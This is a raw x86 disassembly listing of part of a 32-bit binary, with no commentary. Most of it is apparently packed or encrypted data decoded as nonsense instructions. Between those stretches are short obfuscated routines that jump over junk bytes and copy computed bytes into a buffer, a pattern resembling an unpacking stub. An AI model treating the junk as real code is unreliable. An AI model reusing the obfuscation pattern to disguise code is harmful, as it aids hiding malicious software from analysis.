  40a039:	outs   dx,DWORD PTR ds:[esi]
  40a03a:	jns    0x409fc9
  40a03c:	into   
  40a03d:	or     al,0xcd
  40a03f:	sub    eax,0xf6ddb789
  40a044:	dec    eax
  40a045:	fild   DWORD PTR [edi]
  40a047:	aad    0xe4
  40a049:	adc    DWORD PTR [ebp-0x7f10dd41],eax
  40a04f:	jg     0x40a090
  40a051:	nop
  40a052:	pop    eax
  40a053:	jp     0x40a0ce
  40a055:	and    edi,DWORD PTR [edx+edi*8-0x3afb0c02]
  40a05c:	push   edx
  40a05d:	out    0xdf,al
  40a05f:	fistp  QWORD PTR [ecx]
  40a061:	mov    ecx,0xc325a45c
  40a066:	gs call 0xd00d:0x52dace5c
  40a06e:	cli    
  40a06f:	icebp  
  40a070:	rcr    BYTE PTR [edi-0x3d],1
  40a073:	pusha  
  40a074:	or     edx,DWORD PTR [ebx]
  40a076:	cmp    al,0x6c
  40a078:	in     al,0x41
  40a07a:	mov    esp,0x30fe3e33
  40a07f:	fucomip st,st(0)
  40a081:	or     BYTE PTR [edx-0x32962b5a],cl
  40a087:	pushf  
  40a088:	aaa    
  40a089:	push   ebp
  40a08a:	cmp    edi,DWORD PTR [eax+0x39bd053b]
  40a090:	repz and BYTE PTR [edi],ah
  40a093:	sub    bl,al
  40a095:	inc    esp
  40a096:	aas    
  40a097:	enter  0xcaa,0xd3
  40a09b:	xor    DWORD PTR [ecx],0x494fa53b
  40a0a1:	into   
  40a0a2:	(bad)  
  40a0a3:	mov    ah,0x16
  40a0a5:	bound  esi,QWORD PTR [edi]
  40a0a7:	fbstp  TBYTE PTR [esi+0x3f8a973]
  40a0ad:	add    BYTE PTR [edx+eiz*2],0x1f
  40a0b1:	xchg   ecx,eax
  40a0b2:	sub    esi,0xffffffea
  40a0b5:	mov    ds:0x9f34cb65,al
  40a0ba:	xchg   edx,eax
  40a0bb:	adc    eax,0x963cd78c
  40a0c0:	lods   eax,DWORD PTR ds:[esi]
  40a0c1:	cmp    DWORD PTR [edx+0x48],edx
  40a0c4:	mov    DWORD PTR [edi-0x61],edx
  40a0c7:	push   cs
  40a0c8:	push   0xffffffe3
  40a0ca:	inc    ebx
  40a0cb:	dec    eax
  40a0cc:	and    ebp,DWORD PTR [ecx+eax*1-0x4d964310]
  40a0d3:	pop    edx
  40a0d4:	add    BYTE PTR [ebx+0x1bc6f9f2],cl
  40a0da:	xchg   DWORD PTR [ebx],eax
  40a0dc:	mov    ebx,0xda373bfc
  40a0e1:	mov    ch,0x40
  40a0e3:	sub    BYTE PTR [edx+0x6702522e],cl
  40a0e9:	out    0xa1,eax
  40a0eb:	shl    BYTE PTR [esi],1
  40a0ed:	ror    al,cl
  40a0ef:	dec    eax
  40a0f0:	int    0x8b
  40a0f2:	push   ebp
  40a0f3:	in     al,dx
  40a0f4:	shrd   eax,edx,0x2
  40a0f8:	xor    eax,ecx
  40a0fa:	mov    ecx,DWORD PTR [ebp-0x18]
  40a0fd:	shr    edx,0x2
  40a100:	mov    edx,DWORD PTR [ebp-0x14]
  40a103:	xor    edx,edx
  40a105:	shl    ecx,0x1e
  40a108:	or     eax,edx
  40a10a:	mov    ds:0x4227b0,eax
  40a10f:	pop    esi
  40a110:	leave  
  40a111:	ret    
  40a112:	push   ebp
  40a113:	mov    ebp,esp
  40a115:	sub    esp,0x28
  40a118:	push   ebx
  40a119:	push   esi
  40a11a:	push   edi
  40a11b:	mov    DWORD PTR [ebp-0x10],0x67e2
  40a122:	jmp    0x40a3b9
  40a127:	mov    al,ds:0xfc9cf9a5
  40a12c:	pushf  
  40a12d:	mov    al,ds:0xd54f94b9
  40a132:	jecxz  0x40a0cf
  40a134:	data16 clc 
  40a136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a137:	es xchg ebp,eax
  40a139:	mov    esi,0xbec2a9be
  40a13e:	mov    esi,0x939f5ae0
  40a143:	shr    BYTE PTR [edx-0x15],1
  40a146:	xor    BYTE PTR [ebx],dl
  40a148:	cmp    esp,DWORD PTR [ebx+0x222aff75]
  40a14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a14f:	cmp    BYTE PTR [ebx-0x681c44eb],0x93
  40a156:	mov    al,ds:0xbddb73d2
  40a15b:	lds    edx,FWORD PTR [edi]
  40a15d:	call   0xd09:0x794c2b01
  40a164:	sub    al,BYTE PTR [esi+edx*2]
  40a167:	xchg   esp,eax
  40a168:	or     ah,BYTE PTR [esi+0x33]
  40a16b:	bound  ebp,QWORD PTR [esi]
  40a16d:	dec    edi
  40a16e:	xchg   ebx,eax
  40a16f:	jg     0x40a177
  40a171:	cvtpi2ps xmm6,QWORD PTR [ebp+edx*1+0xea70cfa]
  40a179:	aaa    
  40a17a:	pusha  
  40a17b:	loopne 0x40a12c
  40a17d:	stc    
  40a17e:	add    ah,BYTE PTR [eax+ebx*2+0x4a]
  40a182:	imul   esp,DWORD PTR [edx-0x61],0xffffffdd
  40a186:	inc    BYTE PTR [edi+eax*2]
  40a189:	es out dx,al
  40a18b:	mov    eax,ds:0xd31034d3
  40a190:	pop    es
  40a191:	adc    ecx,edi
  40a193:	inc    edx
  40a194:	pop    ds
  40a195:	lahf   
  40a196:	ret    0x261e
  40a199:	push   0x40
  40a19b:	and    BYTE PTR [edx+0x3c71b321],bl
  40a1a1:	loope  0x40a1de
  40a1a3:	jg     0x40a1d7
  40a1a5:	adc    esp,DWORD PTR [eax-0x23]
  40a1a8:	pop    esi
  40a1a9:	adc    eax,0x816dc634
  40a1ae:	fs inc ecx
  40a1b0:	pop    ebp
  40a1b1:	stc    
  40a1b2:	sar    bh,cl
  40a1b4:	inc    esp
  40a1b5:	rcl    BYTE PTR [edi+0x22e195b3],1
  40a1bb:	mov    dl,0x1
  40a1bd:	mov    BYTE PTR [esi+0x7],cl
  40a1c0:	fisub  DWORD PTR [ebx+0x6d]
  40a1c3:	sbb    DWORD PTR ds:0xbc3e6fd0,edx
  40a1c9:	jns    0x40a1cb
  40a1cb:	push   esi
  40a1cc:	adc    ebp,ebx
  40a1ce:	lods   eax,DWORD PTR ds:[esi]
  40a1cf:	and    ecx,DWORD PTR [ecx+0x1a60168b]
  40a1d5:	test   eax,0xcdc0f2de
  40a1da:	lea    esp,[ebp+0xf]
  40a1dd:	fcomp  DWORD PTR [ebp+0x22dc22c3]
  40a1e3:	lds    ebx,FWORD PTR ds:0xeb53fd5d
  40a1e9:	xchg   esi,eax
  40a1ea:	adc    ebx,esp
  40a1ec:	rol    DWORD PTR [ebx-0x77686809],0x75
  40a1f3:	fidiv  WORD PTR [eax+0x50]
  40a1f6:	fnsave [eax+esi*1]
  40a1f9:	xchg   ecx,esi
  40a1fb:	sbb    eax,0xad6cc58e
  40a200:	jb     0x40a1a9
  40a202:	scas   eax,DWORD PTR es:[edi]
  40a203:	push   esi
  40a204:	mov    eax,0xc69cb45e
  40a209:	pushf  
  40a20a:	and    dh,BYTE PTR [eax-0x29ae9b6]
  40a210:	sbb    ecx,DWORD PTR [ecx+0x7a]
  40a213:	xchg   ebx,eax
  40a214:	and    eax,0xe17f85bb
  40a219:	push   ebx
  40a21a:	hlt    
  40a21b:	xchg   esi,eax
  40a21c:	mov    bl,0x6f
  40a21e:	inc    esp
  40a21f:	mov    al,0xe
  40a221:	out    dx,eax
  40a222:	and    ebp,DWORD PTR [ecx-0x4]
  40a225:	rcl    DWORD PTR [ebp+ecx*4-0x70b135d2],0xcd
  40a22d:	xor    eax,0x86f11c41
  40a232:	loop   0x40a239
  40a234:	(bad)  
  40a235:	dec    edx
  40a236:	mov    WORD PTR [ebp-0x3e9fc7e5],es
  40a23c:	cmc    
  40a23d:	and    esi,DWORD PTR [ebx-0x48]
  40a240:	and    esi,DWORD PTR [ebp+0x13]
  40a243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a244:	mov    dl,0xfd
  40a246:	cmp    ebx,esp
  40a248:	(bad)  
  40a249:	mov    ebp,0x7acb59f8
  40a24e:	sti    
  40a24f:	jle    0x40a1ec
  40a251:	bound  edi,QWORD PTR [ebp-0x1a]
  40a254:	rcr    cl,cl
  40a256:	mov    al,ds:0x566bee42
  40a25b:	jge    0x40a2cd
  40a25d:	pop    esi
  40a25e:	retf   0x3ef3
  40a261:	popf   
  40a262:	les    esi,FWORD PTR [edi+0x6a]
  40a265:	sbb    DWORD PTR [edx+0x5baadb3],eax
  40a26b:	fdiv   DWORD PTR [edi+0x6a8ca265]
  40a271:	(bad)  
  40a272:	xor    BYTE PTR [edi+0x46],bh
  40a275:	in     eax,0xa5
  40a277:	xchg   edx,eax
  40a278:	outs   dx,DWORD PTR ds:[esi]
  40a279:	mov    ecx,0xb9065774
  40a27e:	inc    eax
  40a27f:	jmp    0x1837:0xf839fc27
  40a286:	fld    TBYTE PTR [ecx+eiz*8+0x2b36c90]
  40a28d:	in     eax,dx
  40a28e:	arpl   WORD PTR [edx-0x5ece2d2],di
  40a294:	stc    
  40a295:	lock inc ebp
  40a297:	popf   
  40a298:	cdq    
  40a299:	scas   eax,DWORD PTR es:[edi]
  40a29a:	call   0xd8cd:0xa7cab72e
  40a2a1:	mov    WORD PTR [ebx+0x62b3f023],gs
  40a2a7:	out    dx,eax
  40a2a8:	adc    al,0xa8
  40a2aa:	mov    BYTE PTR [ebx+0x39],dh
  40a2ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2ae:	js     0x40a268
  40a2b0:	push   edi
  40a2b1:	adc    eax,0x45a8fa12
  40a2b6:	jle    0x40a318
  40a2b8:	jl     0x40a23c
  40a2ba:	fistp  WORD PTR [eax]
  40a2bc:	std    
  40a2bd:	ins    BYTE PTR es:[edi],dx
  40a2be:	inc    edx
  40a2bf:	retf   
  40a2c0:	in     al,0xf0
  40a2c2:	mov    ecx,0x72b2d56f
  40a2c7:	mov    ah,0x29
  40a2c9:	adc    edx,DWORD PTR [edi]
  40a2cb:	sub    al,0x2e
  40a2cd:	or     al,0xaf
  40a2cf:	mov    al,dl
  40a2d1:	(bad)  
  40a2d2:	and    eax,0x85cc4bab
  40a2d7:	fwait
  40a2d8:	(bad)  
  40a2d9:	in     eax,dx
  40a2da:	push   esp
  40a2db:	ss or  eax,0x94d5f10e
  40a2e1:	clc    
  40a2e2:	div    BYTE PTR [ebx+0x30]
  40a2e5:	jmp    0x40a334
  40a2e7:	sahf   
  40a2e8:	fdivr  st(5),st
  40a2ea:	xor    esp,esi
  40a2ec:	xor    eax,0x1a5e6e74
  40a2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2f2:	data16 jle 0x40a2bc
  40a2f5:	repz mov bl,0x3f
  40a2f8:	pop    esi
  40a2f9:	popf   
  40a2fa:	test   al,0xeb
  40a2fc:	mov    eax,0x49cfb815
  40a301:	xor    al,0xa
  40a303:	or     BYTE PTR [ebp+0x39fdbde3],cl
  40a309:	inc    edx
  40a30a:	jo     0x40a310
  40a30c:	fisub  DWORD PTR [esi-0x46c84299]
  40a312:	cmp    esi,esi
  40a314:	xchg   DWORD PTR [esi-0x42432ec],eax
  40a31a:	outs   dx,DWORD PTR ds:[esi]
  40a31b:	jmp    0x6bc2:0x3a3017ef
  40a322:	adc    eax,0x10996164
  40a327:	jno    0x40a34e
  40a329:	push   ebp
  40a32a:	sbb    edx,esi
  40a32c:	ret    
  40a32d:	dec    esp
  40a32e:	ja     0x40a30b
  40a330:	sub    dl,BYTE PTR [eax-0x80]
  40a333:	mov    al,ds:0x233b76aa
  40a339:	scas   al,BYTE PTR es:[edi]
  40a33a:	jmp    0x3ebc:0x61133287
  40a341:	popf   
  40a342:	bnd je 0x40a30a
  40a345:	adc    BYTE PTR [ecx+0x28],bl
  40a348:	dec    ebx
  40a349:	out    0x77,al
  40a34b:	xor    BYTE PTR [edx+0x19e09d38],0x9c
  40a352:	adc    eax,DWORD PTR [ebp-0x3ab7fafd]
  40a358:	jne    0x40a3cb
  40a35a:	in     eax,dx
  40a35b:	ucomiss xmm7,DWORD PTR [edi]
  40a35e:	retf   
  40a35f:	pop    edi
  40a360:	pushf  
  40a361:	mov    ds:0x8217163,al
  40a366:	(bad)  
  40a367:	retf   
  40a368:	push   0x37
  40a36a:	cmc    
  40a36b:	add    BYTE PTR [esi+edi*1],0xf5
  40a36f:	mov    bh,bl
  40a371:	inc    edi
  40a372:	sub    al,0xc0
  40a374:	loop   0x40a3c9
  40a376:	and    esp,DWORD PTR [esi]
  40a378:	mov    edx,0x30b1c354
  40a37d:	and    bh,ah
  40a37f:	aas    
  40a380:	xor    eax,0xa5f821ab
  40a385:	into   
  40a386:	jmp    0xbd91e15e
  40a38b:	lea    esi,[edx-0x48]
  40a38e:	adc    DWORD PTR [edx+0x54],ebx
  40a391:	pop    esp
  40a392:	jno    0x40a386
  40a394:	or     bh,BYTE PTR [ecx-0x701d4398]
  40a39a:	into   
  40a39b:	mov    al,ds:0x7d558d15
  40a3a0:	lock add ebx,DWORD PTR [ecx]
  40a3a3:	mov    ds:0xaaf443f3,eax
  40a3a8:	call   0xe380:0xb1010cda
  40a3af:	xchg   edi,eax
  40a3b0:	or     al,0xa9
  40a3b2:	fucomi st,st(5)
  40a3b4:	and    BYTE PTR [ebx],ch
  40a3b6:	xchg   esi,eax
  40a3b7:	adc    DWORD PTR [edi+eax*8+0x4726fc45],ebx
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	mov    DWORD PTR [ebp-0x8],0x580
  40a3c7:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40a3ce:	mov    DWORD PTR [ebp-0x28],0x3294
  40a3d5:	mov    DWORD PTR [ebp-0x24],0x643
  40a3dc:	mov    DWORD PTR [ebp-0x20],0x2545
  40a3e3:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40a3ea:	xor    ebx,ebx
  40a3ec:	inc    ebx
  40a3ed:	jmp    0x40a684
  40a3f2:	ins    DWORD PTR es:[edi],dx
  40a3f3:	shr    ebx,0x9a
  40a3f6:	jl     0x40a3b4
  40a3f8:	scas   eax,DWORD PTR es:[edi]
  40a3f9:	sub    bl,BYTE PTR [ebx+ebp*1-0x7a]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	cwde   
  40a3ff:	sub    ecx,DWORD PTR [eax-0x6e]
  40a402:	adc    DWORD PTR [ebx-0x3d564142],ebx
  40a408:	mov    esi,0xe23defbe
  40a40d:	fiadd  DWORD PTR [edx]
  40a40f:	stc    
  40a410:	xor    ah,cl
  40a412:	and    ch,cl
  40a414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a415:	pop    ebp
  40a416:	and    esi,DWORD PTR [ebx]
  40a418:	sbb    bl,BYTE PTR [edi+0xf10b7b8]
  40a41e:	mov    ds:0x3b46627a,eax
  40a423:	add    BYTE PTR [esi-0x462cc953],al
  40a429:	mov    al,ds:0x6adb13ec
  40a42e:	inc    esi
  40a42f:	mov    BYTE PTR [edi+0x322e8f83],dl
  40a435:	cdq    
  40a436:	fcmovne st,st(7)
  40a438:	pop    ebx
  40a439:	mov    DWORD PTR [esi-0x4a],0x23f2caf2
  40a440:	cmp    ecx,DWORD PTR [ebx+0x6d]
  40a443:	test   DWORD PTR [ecx+edx*8],esi
  40a446:	mul    DWORD PTR [esi-0x62484e2]
  40a44c:	adc    cl,bh
  40a44e:	ins    BYTE PTR es:[edi],dx
  40a44f:	push   ebx
  40a450:	mov    dh,0xcb
  40a452:	out    0xfd,al
  40a454:	push   0xffffffcc
  40a456:	(bad)  
  40a457:	idiv   DWORD PTR [ebp+0x34]
  40a45a:	cmp    DWORD PTR [ebp-0x292e2be],esp
  40a460:	ss xor ch,ch
  40a463:	pop    edi
  40a464:	inc    esp
  40a465:	sub    eax,0x24bee83b
  40a46a:	mov    eax,0xbc5173b
  40a46f:	jnp    0x40a4e2
  40a471:	and    eax,0x6cc12058
  40a476:	bound  edi,QWORD PTR [ecx-0x8]
  40a479:	outs   dx,DWORD PTR ds:[esi]
  40a47a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a47b:	add    dh,cl
  40a47d:	mov    al,0xdb
  40a47f:	pop    ebx
  40a480:	or     BYTE PTR [esi+esi*1],ch
  40a483:	push   edx
  40a484:	and    al,0xca
  40a486:	enter  0xe1cc,0x20
  40a48a:	inc    ecx
  40a48b:	jmp    DWORD PTR [edx]
  40a48d:	inc    esp
  40a48e:	xchg   edx,eax
  40a48f:	push   ds
  40a490:	dec    eax
  40a491:	pop    ebx
  40a492:	add    esp,esp
  40a494:	xor    DWORD PTR [eax],ebp
  40a496:	xchg   ecx,eax
  40a497:	les    edx,FWORD PTR [edi+0x5c]
  40a49a:	dec    esi
  40a49b:	jbe    0x40a4dc
  40a49d:	and    BYTE PTR [ecx-0x5058be16],0x6d
  40a4a4:	cmc    
  40a4a5:	sub    eax,0xd63bd7af
  40a4aa:	xor    bh,ah
  40a4ac:	pop    ebx
  40a4ad:	outs   dx,BYTE PTR ds:[esi]
  40a4ae:	ins    BYTE PTR es:[edi],dx
  40a4af:	xor    BYTE PTR ds:0xacb652f4,bl
  40a4b5:	inc    eax
  40a4b6:	sahf   
  40a4b7:	loopne 0x40a47c
  40a4b9:	inc    edi
  40a4ba:	out    0xcb,eax
  40a4bc:	jns    0x40a4d5
  40a4be:	push   eax
  40a4bf:	arpl   sp,cx
  40a4c1:	push   ds
  40a4c2:	pop    eax
  40a4c3:	mov    esp,0x31e516d7
  40a4c8:	push   eax
  40a4c9:	jne    0x40a4d1
  40a4cb:	fcom   DWORD PTR [ecx+ecx*1]
  40a4ce:	mov    bh,0x62
  40a4d0:	mov    ch,0x49
  40a4d2:	push   edi
  40a4d3:	pop    es
  40a4d4:	xchg   ebp,eax
  40a4d5:	scas   eax,DWORD PTR es:[edi]
  40a4d6:	mov    cl,cl
  40a4d8:	imul   esi,edx,0x2f
  40a4db:	jle    0x40a4cd
  40a4dd:	xor    esi,DWORD PTR [ebp+0x52ea387d]
  40a4e3:	jb     0x40a546
  40a4e5:	pop    es
  40a4e6:	fwait
  40a4e7:	xor    esp,eax
  40a4e9:	push   ebp
  40a4ea:	sub    dh,cl
  40a4ec:	adc    BYTE PTR [edx+0x7e06afa3],0x56
  40a4f3:	cmp    edx,0xffffffe7
  40a4f6:	xor    al,0x95
  40a4f8:	retf   
  40a4f9:	inc    esi
  40a4fa:	xor    al,BYTE PTR [edx-0x18]
  40a4fd:	sar    DWORD PTR [ebx+ebp*8],1
  40a500:	jl     0x40a514
  40a502:	pop    ebp
  40a503:	inc    esp
  40a504:	std    
  40a505:	or     ebx,DWORD PTR ss:[ecx+0x3983f742]
  40a50c:	add    BYTE PTR ds:0xf383b6bd,cl
  40a512:	data16 mov dl,0x86
  40a515:	push   edi
  40a516:	test   DWORD PTR [eax+0x3],ecx
  40a519:	mov    ah,0xc
  40a51b:	lahf   
  40a51c:	inc    ecx
  40a51d:	scas   al,BYTE PTR es:[edi]
  40a51e:	lock fidivr WORD PTR [edi-0x5c8bf048]
  40a525:	div    DWORD PTR [ebp-0x40]
  40a528:	ss cmc 
  40a52a:	rol    DWORD PTR [edx-0x1e],1
  40a52d:	(bad)  
  40a52e:	in     al,0x30
  40a530:	lds    ebp,FWORD PTR es:[edx+0x70]
  40a534:	inc    ebp
  40a535:	dec    esi
  40a536:	es jno 0x40a528
  40a539:	sub    BYTE PTR [edx+0x6101ff0],ah
  40a53f:	aad    0x4e
  40a541:	jmp    0xf5dd5607
  40a546:	into   
  40a547:	or     bh,cl
  40a549:	xchg   sp,ax
  40a54b:	pop    es
  40a54c:	out    dx,eax
  40a54d:	rcr    DWORD PTR [ebp-0x3c681f17],0x53
  40a554:	pop    eax
  40a555:	ret    0x7e8f
  40a558:	or     BYTE PTR [ebp-0x53],cl
  40a55b:	mov    dh,BYTE PTR [ebp+0x38]
  40a55e:	push   0x6507bf8
  40a563:	jo     0x40a52c
  40a565:	loopne 0x40a5ce
  40a567:	aam    0xb5
  40a569:	and    eax,0x510061f7
  40a56e:	dec    ecx
  40a56f:	mov    al,0x90
  40a571:	mov    cs,WORD PTR [eax-0x6ae5e22e]
  40a577:	retf   0x8932
  40a57a:	cmp    DWORD PTR [edi-0x24],0xffffff9d
  40a57e:	xchg   esi,eax
  40a57f:	outs   dx,DWORD PTR ds:[esi]
  40a580:	(bad)  [edx]
  40a582:	mov    ch,0x6b
  40a584:	sub    eax,0x7ca514ac
  40a589:	add    DWORD PTR [esi],esi
  40a58b:	xchg   edx,eax
  40a58c:	inc    ebp
  40a58d:	mov    edi,0xa8cd4d14
  40a592:	push   eax
  40a593:	(bad)  
  40a594:	push   edi
  40a595:	fcmove st,st(6)
  40a597:	xor    eax,ebx
  40a599:	or     eax,0x12bb07b1
  40a59e:	push   0xffffffbe
  40a5a0:	mov    WORD PTR [esi-0x40],?
  40a5a3:	sub    eax,0x8a783f77
  40a5a8:	jg     0x40a5fb
  40a5aa:	stos   DWORD PTR es:[edi],eax
  40a5ab:	inc    ebx
  40a5ac:	mov    al,0xed
  40a5ae:	and    DWORD PTR [edi-0x25fd9afb],0xffffff9f
  40a5b5:	pop    ss
  40a5b6:	xor    DWORD PTR [ebp+0x70],eax
  40a5b9:	push   0xdead6de0
  40a5be:	mov    bl,0x38
  40a5c0:	pop    esp
  40a5c1:	repz sar DWORD PTR [edi],1
  40a5c4:	add    DWORD PTR [edx],0xabe37b64
  40a5ca:	(bad)  
  40a5cb:	out    0x13,eax
  40a5cd:	hlt    
  40a5ce:	imul   esp,DWORD PTR [ebx],0xf9314b14
  40a5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5d5:	fwait
  40a5d6:	in     al,dx
  40a5d7:	jns    0x40a626
  40a5d9:	fnstcw WORD PTR [ebx+0x28]
  40a5dc:	fist   WORD PTR [esp+edi*1-0x35]
  40a5e0:	lods   al,BYTE PTR gs:[esi]
  40a5e2:	popa   
  40a5e3:	mov    eax,0xd6d7214e
  40a5e8:	inc    ebx
  40a5e9:	aas    
  40a5ea:	dec    edx
  40a5eb:	bnd jge 0x40a570
  40a5ee:	(bad)  
  40a5ef:	jbe    0x40a645
  40a5f1:	lds    ecx,FWORD PTR [eax+0x3f]
  40a5f4:	fidiv  WORD PTR [esi-0x56]
  40a5f7:	jae    0xa3ec83e8
  40a5fd:	fidiv  WORD PTR [edi+0x12]
  40a600:	cmp    esp,esi
  40a602:	scas   al,BYTE PTR es:[edi]
  40a603:	jno    0x40a5c0
  40a605:	cli    
  40a606:	and    al,0x54
  40a608:	cmp    al,0xb
  40a60a:	popa   
  40a60b:	mov    esi,0xc55b2631
  40a610:	push   es
  40a611:	(bad)  
  40a612:	ja     0x40a5e3
  40a614:	clc    
  40a615:	xchg   BYTE PTR [edi+0x1ead5f1a],dh
  40a61b:	retf   
  40a61c:	pop    ds
  40a61d:	xchg   esp,eax
  40a61e:	out    0xa0,eax
  40a620:	inc    eax
  40a621:	ja     0x40a5ac
  40a623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a624:	sbb    DWORD PTR [eax+0x64],0x3f
  40a628:	inc    edi
  40a629:	add    DWORD PTR [esi+esi*8+0x27c72c18],ebp
  40a630:	add    bl,BYTE PTR [ecx-0xd]
  40a633:	inc    esp
  40a634:	sub    esp,DWORD PTR [esi]
  40a636:	dec    edi
  40a637:	mov    ecx,0xa7e0172
  40a63c:	dec    ebx
  40a63d:	push   ebx
  40a63e:	pop    ebx
  40a63f:	sub    eax,0xdcd2e059
  40a644:	push   ebx
  40a645:	push   cs
  40a646:	ins    BYTE PTR es:[edi],dx
  40a647:	xchg   edx,eax
  40a648:	into   
  40a649:	gs pop ecx
  40a64b:	(bad)  
  40a64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a64d:	fwait
  40a64e:	call   DWORD PTR [edi-0x20]
  40a651:	daa    
  40a652:	xor    al,0xff
  40a654:	(bad)  
  40a655:	xchg   esi,eax
  40a656:	aam    0xf
  40a658:	add    al,0xe2
  40a65a:	fnstenv [edi-0x3832eeaa]
  40a660:	jae    0x40a65b
  40a662:	and    esi,DWORD PTR [edx+0x24]
  40a665:	add    eax,DWORD PTR [esp+eiz*2-0x40]
  40a669:	and    al,0x14
  40a66b:	lea    ebp,[ebx+0x71b27341]
  40a671:	lds    ebp,FWORD PTR [esi]
  40a673:	into   
  40a674:	rol    BYTE PTR [ecx-0x51],0xd8
  40a678:	loope  0x40a655
  40a67a:	push   ebp
  40a67b:	loop   0x40a6a9
  40a67d:	push   ss
  40a67e:	and    DWORD PTR [eax-0x36d9d2b6],0xffffff89
  40a685:	pop    ebp
  40a686:	call   0xb22cec52
  40a68b:	jbe    0x40a68d
  40a68d:	add    BYTE PTR [ebx+0x458bf84d],cl
  40a693:	cld    
  40a694:	sub    ecx,eax
  40a696:	add    ecx,DWORD PTR [ebp-0xc]
  40a699:	add    ecx,DWORD PTR [ebp-0x10]
  40a69c:	imul   ecx,ecx,0x1f80
  40a6a2:	add    ecx,0x727e
  40a6a8:	xor    ecx,0x106c92f2
  40a6ae:	mov    DWORD PTR [ebp-0x8],0x113c
  40a6b5:	mov    DWORD PTR [ebp-0xc],0x3d61
  40a6bc:	mov    DWORD PTR [ebp-0x10],0x16e9
  40a6c3:	mov    DWORD PTR [ebp-0x4],0x21aa
  40a6ca:	mov    eax,DWORD PTR [ebp-0x10]
  40a6cd:	or     eax,0x3611
  40a6d2:	add    eax,DWORD PTR [ebp-0xc]
  40a6d5:	mov    edx,DWORD PTR [ebp-0x8]
  40a6d8:	and    eax,edx
  40a6da:	mov    edx,ecx
  40a6dc:	sub    edx,eax
  40a6de:	mov    eax,DWORD PTR [ebp-0x4]
  40a6e1:	mov    esi,DWORD PTR ds:0x4226a8
  40a6e7:	mov    esi,DWORD PTR [esi+0x1cc]
  40a6ed:	add    eax,0x6772
  40a6f2:	or     eax,0x1f24
  40a6f7:	sub    eax,0x7046
  40a6fc:	xor    eax,0x497a
  40a701:	sub    esi,eax
  40a703:	mov    eax,DWORD PTR [ebp+0x8]
  40a706:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40a70d:	mov    BYTE PTR [esi+ecx*1],al
  40a710:	mov    eax,DWORD PTR [ebp-0x14]
  40a713:	mov    esi,DWORD PTR [ebp-0x18]
  40a716:	and    eax,0x2389
  40a71b:	xor    eax,0x695
  40a720:	xor    edx,edx
  40a722:	div    esi
  40a724:	lea    ecx,[ecx+eax*1-0x2413]
  40a72b:	mov    eax,DWORD PTR [ebp-0x1c]
  40a72e:	add    eax,DWORD PTR [ebp-0x20]
  40a731:	mov    edx,DWORD PTR [ebp-0x24]
  40a734:	and    eax,edx
  40a736:	mov    edx,DWORD PTR [ebp-0x28]
  40a739:	imul   eax,edx
  40a73c:	mov    edx,0xd0c8f
  40a741:	sub    edx,eax
  40a743:	cmp    ecx,edx
  40a745:	jbe    0x40a6ae
  40a74b:	push   0x2
  40a74d:	pop    eax
  40a74e:	mov    DWORD PTR [ebp-0x1c],eax
  40a751:	mov    DWORD PTR [ebp-0x20],ebx
  40a754:	mov    DWORD PTR [ebp-0x24],0x5
  40a75b:	mov    DWORD PTR [ebp-0x28],0x6686
  40a762:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40a769:	mov    DWORD PTR [ebp-0x4],eax
  40a76c:	mov    DWORD PTR [ebp+0x8],0x739a
  40a773:	mov    DWORD PTR [ebp-0xc],0xf3a
  40a77a:	xor    edx,edx
  40a77c:	mov    DWORD PTR [ebp-0x10],0x429
  40a783:	mov    eax,DWORD PTR [ebp-0x28]
  40a786:	mov    ecx,DWORD PTR [ebp-0x24]
  40a789:	sub    eax,0x175c
  40a78e:	div    ecx
  40a790:	mov    ecx,DWORD PTR [ebp-0x20]
  40a793:	xor    edx,edx
  40a795:	mov    edi,0x4db5
  40a79a:	div    ecx
  40a79c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a79f:	xor    edx,edx
  40a7a1:	div    ecx
  40a7a3:	xor    edx,edx
  40a7a5:	mov    ecx,eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	imul   ecx,ecx,0x2e01
  40a7b0:	mov    esi,DWORD PTR [ebp-0x4]
  40a7b3:	add    eax,edi
  40a7b5:	div    esi
  40a7b7:	mov    edx,DWORD PTR [ebp-0x8]
  40a7ba:	mov    esi,0x940a7
  40a7bf:	sub    ecx,0x16bea86
  40a7c5:	jmp    0x40aa5c
  40a7ca:	lds    ecx,FWORD PTR [ebp+0x709870ff]
  40a7d0:	mov    dh,0xb7
  40a7d2:	and    dh,BYTE PTR [esi+ecx*1]
  40a7d5:	sahf   
  40a7d6:	xchg   ebx,eax
  40a7d7:	mov    eax,ds:0x9ffea4fa
  40a7dc:	mov    esi,0xbec2a9be
  40a7e1:	mov    esi,0x93bb69c0
  40a7e6:	pop    ebp
  40a7e7:	mov    BYTE PTR [esi+edi*2+0x5a15a8c],al
  40a7ee:	call   0x100f:0x49593b21
  40a7f5:	and    al,0x6d
  40a7f7:	adc    al,0x4b
  40a7f9:	pop    ss
  40a7fa:	daa    
  40a7fb:	mov    ds:0x64647a43,eax
  40a800:	fsubr  st(2),st
  40a802:	clc    
  40a803:	cmp    eax,0xfaf9ab2c
  40a808:	pusha  
  40a809:	jmp    0xcc821d10
  40a80e:	push   edi
  40a80f:	or     ebp,esp
  40a811:	xchg   ecx,eax
  40a812:	lods   al,BYTE PTR ds:[esi]
  40a813:	xchg   BYTE PTR [ebp-0x36],dh
  40a816:	call   0x9e2b2d96
  40a81b:	fstp   TBYTE PTR [ecx+0x3a]
  40a81e:	fisub  WORD PTR [edi]
  40a820:	jbe    0x40a89c
  40a822:	jmp    0xc9ba:0xbe6bb828
